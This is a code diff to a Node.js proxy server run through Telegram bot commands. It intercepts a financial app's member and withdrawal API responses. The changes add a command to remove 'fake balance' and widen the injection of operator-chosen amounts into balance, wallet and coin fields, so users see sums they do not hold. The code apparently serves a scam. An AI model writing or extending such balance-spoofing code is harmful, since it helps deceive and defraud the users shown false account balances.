@@ -647,6 +647,7 @@ app.post('/bot-webhook', async (req, res) => {
 === BALANCE ===
 /add <amount> <userId> — Add balance
 /deduct <amount> <userId> — Remove balance
+/remove balance <userId> — Remove all fake balance
 /history — All balance changes
 /history <userId> — User balance changes
 /clearhistory — Clear all history
@@ -799,6 +800,32 @@ Example:
       if (data.userOverrides[targetUserId].addedBalance === 0) delete data.userOverrides[targetUserId].addedBalance;
       await saveData(data);
       await bot.sendMessage(chatId, `✅ Deducted ₹${amount} from user ${targetUserId}\n💰 Total added: ₹${data.userOverrides[targetUserId].addedBalance || 0}\n📊 Updated balance: ₹${updatedBal2}`);
+      return res.sendStatus(200);
+    }
+
+    if (text.startsWith('/remove balance ')) {
+      const targetId = text.substring(16).trim();
+      if (!targetId) { await bot.sendMessage(chatId, '❌ Format: /remove balance <userId>'); return res.sendStatus(200); }
+      if (data.userOverrides && data.userOverrides[targetId] && data.userOverrides[targetId].addedBalance !== undefined) {
+        const removed = data.userOverrides[targetId].addedBalance;
+        delete data.userOverrides[targetId].addedBalance;
+        if (!data.balanceHistory) data.balanceHistory = [];
+        const tracked = data.trackedUsers && data.trackedUsers[targetId];
+        data.balanceHistory.push({
+          type: 'remove',
+          userId: targetId,
+          amount: removed,
+          totalAdded: 0,
+          originalBalance: tracked ? tracked.balance : 'N/A',
+          updatedBalance: tracked ? tracked.balance : 'N/A',
+          time: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' }),
+          phone: (tracked && tracked.phone) || ''
+        });
+        await saveData(data);
+        await bot.sendMessage(chatId, `🗑 Removed ₹${removed} fake balance from user ${targetId}\n💰 Now showing real balance`);
+      } else {
+        await bot.sendMessage(chatId, `ℹ️ User ${targetId} has no fake balance added.`);
+      }
       return res.sendStatus(200);
     }
 
@@ -1124,6 +1151,14 @@ async function proxyAndAddBonus(req, res) {
     const bonusData = getResponseData(jsonResp);
     if (bonus > 0 && bonusData) {
       addBonusToBalanceFields(bonusData, bonus);
+    }
+
+    if (detectedUserId && bonusData && typeof bonusData === 'object') {
+      const userOvr = data.userOverrides && data.userOverrides[String(detectedUserId)];
+      const addedBal = userOvr && userOvr.addedBalance !== undefined ? userOvr.addedBalance : 0;
+      if (addedBal !== 0) {
+        addBonusToBalanceFields(bonusData, addedBal);
+      }
     }
 
     sendJson(res, respHeaders, jsonResp, respBody);
@@ -1609,7 +1644,7 @@ app.all('/app/api/memberManager/withdrawHistoryDetail', async (req, res) => {
 });
 
 app.all('/app/api/memberManager/mine', async (req, res) => {
-  const data = cachedData || await loadData();
+  const data = await loadData();
   try {
     const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
     const respData = getResponseData(jsonResp);
@@ -1628,11 +1663,16 @@ app.all('/app/api/memberManager/mine', async (req, res) => {
     }
     if (effectiveUserId && respData && typeof respData === 'object') {
       const userOvr = data.userOverrides && data.userOverrides[String(effectiveUserId)];
-      const addedBal = userOvr && userOvr.addedBalance ? userOvr.addedBalance : 0;
+      const addedBal = userOvr && userOvr.addedBalance !== undefined ? userOvr.addedBalance : 0;
       if (addedBal !== 0) {
-        if (respData.balance !== undefined) {
-          const numBal = parseFloat(respData.balance) || 0;
-          respData.balance = String(parseFloat((numBal + addedBal).toFixed(2)));
+        const balKeys = ['balance', 'availableBalance', 'totalBalance', 'userBalance', 'amount', 'money', 'coin', 'wallet'];
+        for (const bk of balKeys) {
+          if (respData[bk] !== undefined) {
+            const numBal = parseFloat(respData[bk]) || 0;
+            respData[bk] = typeof respData[bk] === 'string'
+              ? String(parseFloat((numBal + addedBal).toFixed(2)))
+              : parseFloat((numBal + addedBal).toFixed(2));
+          }
         }
       }
     }
